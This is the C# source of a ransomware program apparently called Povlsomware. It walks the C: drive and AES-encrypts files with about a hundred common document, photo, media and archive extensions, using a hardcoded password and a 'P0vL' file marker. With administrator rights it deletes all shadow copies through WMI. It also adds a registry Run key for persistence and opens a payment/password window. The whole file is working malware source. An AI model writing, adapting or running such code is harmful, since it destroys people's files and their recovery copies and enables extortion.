using System;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Security.Principal;
using System.Management;
using Microsoft.Win32;

namespace Povlsomware
{
    class Program
    {
        public static int count = 0;
        public static List<string> encryptedFiles = new List<string>();
        private static char[] password = new char[] { 'R', 'a', 'k', 'u' };
        private static readonly string[] extensionsToEncrypt = { "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt


        [STAThread]
        public static char[] GetPass()
        {
            return password;
        }

        static void Main()
        {
            //Start the attack
            Attack();
            
            //Destroy ShadowCopy
            DestroyCopy();
            
            //Add simple persistance
            SetStartup();

            //Creates a popup that lets you view the encrypted files and add the password
            CreateUI();

        }

        static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rk.GetValue("Povlsomware") == null && !Application.ExecutablePath.Contains("rundll32.exe"))
            {
                rk.SetValue("Povlsomware", "\"" + Application.ExecutablePath + "\"");
            }

        }

        static void CreateUI()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            PayM3 thx = new PayM3();
            Application.Run(thx);
        }

        //Decrypt the file
        public static void DecryptFile(string fileEncrypted, string password)
        {
            // Hash the password with SHA256
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            // read the content of the file as bytes
            byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted).Skip(4).ToArray();
            // Decrypt the bytes
            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            // Open the file and remove the encrypted content
            FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
            fileStream.SetLength(0);
            fileStream.Close();
            // Append the content as decrypted
            using (var stream = new FileStream(fileEncrypted, FileMode.Append))
            {
                stream.Write(bytesDecrypted, 0, bytesDecrypted.Length);
                Console.WriteLine("Decrypted: " + fileEncrypted);
            }
        }

        public static void DestroyCopy()
        {
            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            
            if (isElevated)
            {
                string NamespacePath = "\\\\.\\ROOT\\cimv2";
                string ClassName = "Win32_ShadowCopy";
                //Create ManagementClass
                ManagementClass oClass = new ManagementClass(NamespacePath + ":" + ClassName);
                
                //Get all instances of the class and enumerate them
                try {
                    foreach (ManagementObject oObject in oClass.GetInstances())
                    {
                        //access a property of the Management object
                        oObject.Delete();
                    }
                } catch (Exception e)
                {
                    Console.WriteLine("Could not delete shadow copy if any " + e.Message);
                }


            }
            
        }

        //Encrypt the file
        public static void EncryptFile(string fileUnencrypted)
        {
            // Hash the password with SHA256
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            // read the content of the file as bytes
            byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
            // Encrypt the bytes
            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            // Open the file and remove original content
            FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
            fileStream.SetLength(0);
            fileStream.Close();
            // Append the content as encrypted
            using (var stream = new FileStream(fileUnencrypted, FileMode.Append))
            {
                if (stream.CanWrite)
                {
                    byte[] mark = Encoding.UTF8.GetBytes("P0vL");
                    stream.Write(mark, 0, mark.Length);
                    stream.Write(bytesEncrypted, 0, bytesEncrypted.Length);
                    Console.WriteLine("Encrypted: " + fileUnencrypted);
                    count++;
                    encryptedFiles.Add(fileUnencrypted);
                }
            }
        }

        public static void Attack()
        {
            string startDirectory = @"C:\"; //Where to start from
            ProcessDirectory(startDirectory, 1, "");
        }

        public static void UndoAttack(string decryption_password)
        {
            string startDirectory = @"C:\"; //Where to start from
            ProcessDirectory(startDirectory, 0, decryption_password);
        }

        // Process all files in the directory passed in, recurse on any directories 
        // that are found, and process the files they contain. 
        //action 1 = encrypt, 0 = decrypt
        public static void ProcessDirectory(string targetDirectory, int action, string password)
        {
            // Process the list of files found in the directory.
            var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => extensionsToEncrypt.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase)));
            foreach (string fileName in fileEntries)
            {
                ProcessFile(fileName, action, password);
            }

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
                try
                {   //Dont go into windows program files and temporary internet files. And other #ew ugly
                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\") && !subdirectory.Contains("\\Povlsomware-master\\") && !subdirectory.Contains("\\Povlsomware\\"))
                    {
                            ProcessDirectory(subdirectory, action, password);
                    }
                }
                catch
                {
                }
        }


        public static bool IsMarked(string fileName)
        {
            byte[] mark = Encoding.ASCII.GetBytes("P0vL");
            byte[] firstFourBytes = File.ReadAllBytes(fileName).Take(4).ToArray();
            if (mark.SequenceEqual(firstFourBytes))
            {
                count++;
                encryptedFiles.Add(fileName);
                return true;
            }
            return false;
        }

        // For each found file do the following.
        public static void ProcessFile(string fileName, int action, string password)
        {
            if (action == 1 && !IsMarked(fileName))
            {
                try
                {
                    EncryptFile(fileName);
                }
                catch
                {
                }
            }
            else if (action == 0 && IsMarked(fileName))
            {
                try
                {
                    DecryptFile(fileName, password);
                }
                catch
                {
                }
            }
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
    }
}